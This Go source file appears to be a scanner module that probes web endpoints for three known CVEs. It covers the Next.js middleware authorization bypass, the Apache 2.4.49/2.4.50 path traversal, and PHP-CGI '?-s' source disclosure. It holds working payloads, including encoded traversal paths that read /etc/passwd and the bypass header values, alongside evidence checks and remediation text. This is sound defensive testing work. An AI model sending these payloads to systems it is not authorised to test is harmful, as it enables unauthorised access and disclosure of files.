package active

import (
	"context"
	"net/http"
	"net/url"
	"strings"
)

// KnownCVEs probes endpoints for high-impact, deterministic web CVEs where a
// specific mechanism and proof of impact identify the exact CVE:
//   - CVE-2025-29927: Next.js Middleware Authorization Bypass via x-middleware-subrequest
//   - CVE-2021-41773 / CVE-2021-42013: Apache HTTP Server 2.4.49/2.4.50 Path Traversal & File Read
//   - CVE-2012-1823: PHP-CGI Query-String Argument Injection (?-s source disclosure)
type KnownCVEs struct{}

// Name implements Module.
func (KnownCVEs) Name() string { return "known_cves" }

// Level implements Module.
func (KnownCVEs) Level() Level { return LevelEndpoint }

// Scan probes the endpoint for deterministic CVE-specific mechanisms.
func (KnownCVEs) Scan(ctx context.Context, t *Transport, p Point, baseline *Response) []Finding {
	if baseline == nil {
		return nil
	}
	var findings []Finding

	// 1. CVE-2025-29927 — Next.js Middleware Authorization Bypass
	// Triggered only when the baseline endpoint enforces access control (401/403).
	if baseline.StatusCode == http.StatusUnauthorized || baseline.StatusCode == http.StatusForbidden {
		mwHeaders := []string{
			"middleware:middleware:middleware:middleware:middleware",
			"src/middleware:src/middleware:src/middleware:src/middleware:src/middleware",
		}
		for _, hdrVal := range mwHeaders {
			if ctx.Err() != nil {
				return findings
			}
			extra := http.Header{"x-middleware-subrequest": {hdrVal}}
			resp, err := t.Do(ctx, http.MethodGet, p.URL, p.Values, false, extra)
			if err != nil || resp == nil {
				continue
			}
			if resp.StatusCode == http.StatusOK && len(strings.TrimSpace(resp.Body)) > 0 && resp.Body != baseline.Body {
				ev := strings.TrimSpace(resp.Body)
				if len(ev) > 220 {
					ev = ev[:220]
				}
				f, _ := NewFinding(Spec{
					Module:   "known_cves",
					CWE:      "CWE-287",
					CVE:      "CVE-2025-29927",
					CVEs:     []string{"CVE-2025-29927"},
					Title:    "CVE-2025-29927: Next.js middleware authorization bypass on " + p.URL,
					Claimed:  SeverityCritical,
					Tier:     TierVerified,
					Point:    p,
					Payload:  "x-middleware-subrequest: " + hdrVal,
					Evidence: ev,
					Description: "The protected endpoint returned HTTP " + baseline.Status + " without the header, " +
						"but answered HTTP 200 OK when sent 'x-middleware-subrequest: " + hdrVal + "' (CVE-2025-29927).",
					Remediation: "Upgrade Next.js to >= 15.2.3, >= 14.2.25, >= 13.5.9, or >= 12.3.5, and strip " +
						"external 'x-middleware-subrequest' headers at the reverse proxy / edge.",
				})
				findings = append(findings, f)
				break
			}
		}
	}

	// 2. CVE-2021-41773 / CVE-2021-42013 — Apache HTTP Server 2.4.49 / 2.4.50 Path Traversal
	if parsed, err := url.Parse(p.URL); err == nil && (parsed.Path == "" || parsed.Path == "/") {
		origin := parsed.Scheme + "://" + parsed.Host
		apachePayloads := []struct {
			path string
			cve  string
		}{
			{"/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd", "CVE-2021-41773"},
			{"/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd", "CVE-2021-42013"},
		}
		for _, ap := range apachePayloads {
			if ctx.Err() != nil {
				return findings
			}
			targetURL := origin + ap.path
			resp, err := t.Do(ctx, http.MethodGet, targetURL, nil, false, nil)
			if err != nil || resp == nil {
				continue
			}
			if Fresh(baseline, resp, "root:x:0:0:") {
				f, _ := NewFinding(Spec{
					Module:   "known_cves",
					CWE:      "CWE-22",
					CVE:      ap.cve,
					CVEs:     []string{"CVE-2021-41773", "CVE-2021-42013"},
					Title:    ap.cve + ": Apache HTTP Server path traversal on " + targetURL,
					Claimed:  SeverityCritical,
					Tier:     TierVerified,
					Point:    Point{URL: targetURL, Method: http.MethodGet},
					Payload:  ap.path,
					Evidence: Snippet(resp.Body, "root:x:0:0:", 220),
					Description: "The server resolved an encoded dot-segment traversal inside /cgi-bin/ and " +
						"returned /etc/passwd (" + ap.cve + ").",
					Remediation: "Upgrade Apache HTTP Server to >= 2.4.51 and ensure 'Require all denied' is " +
						"configured on the root directory.",
				})
				findings = append(findings, f)
				break
			}
		}
	}

	// 3. CVE-2012-1823 — PHP-CGI Argument Injection (?-s source disclosure)
	if strings.HasSuffix(strings.ToLower(p.URL), ".php") && ctx.Err() == nil {
		probeURL := p.URL + "?-s"
		if resp, err := t.Do(ctx, http.MethodGet, probeURL, nil, false, nil); err == nil && resp != nil {
			if resp.StatusCode == http.StatusOK && Fresh(baseline, resp, "<code><span style=") && strings.Contains(resp.Body, "&lt;?php") {
				f, _ := NewFinding(Spec{
					Module:   "known_cves",
					CWE:      "CWE-88",
					CVE:      "CVE-2012-1823",
					CVEs:     []string{"CVE-2012-1823"},
					Title:    "CVE-2012-1823: PHP-CGI query-string argument injection on " + p.URL,
					Claimed:  SeverityHigh,
					Tier:     TierVerified,
					Point:    Point{URL: probeURL, Method: http.MethodGet},
					Payload:  "?-s",
					Evidence: Snippet(resp.Body, "&lt;?php", 220),
					Description: "Passing '?-s' in the query string caused PHP-CGI to treat the query as a " +
						"command-line flag and return syntax-highlighted PHP source code (CVE-2012-1823).",
					Remediation: "Upgrade PHP or configure the web server to reject query strings starting with '-' when no '=' is present.",
				})
				findings = append(findings, f)
			}
		}
	}

	return findings
}
